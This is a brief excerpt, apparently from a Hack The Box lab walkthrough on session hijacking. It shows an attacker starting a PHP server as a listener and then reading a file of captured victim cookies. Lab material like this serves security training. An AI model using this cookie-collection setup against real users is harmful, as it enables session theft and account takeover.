...
`bryan25@htb[/htb]$ mkdir /tmp/tmpserver bryan25@htb[/htb]$ cd /tmp/tmpserver bryan25@htb[/htb]$ sudo php -S 0.0.0.0:80 PHP 7.4.15 Development Server (http://0.0.0.0:80) started`
...
`bryan25@htb[/htb]$ cat cookies.txt  Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2`
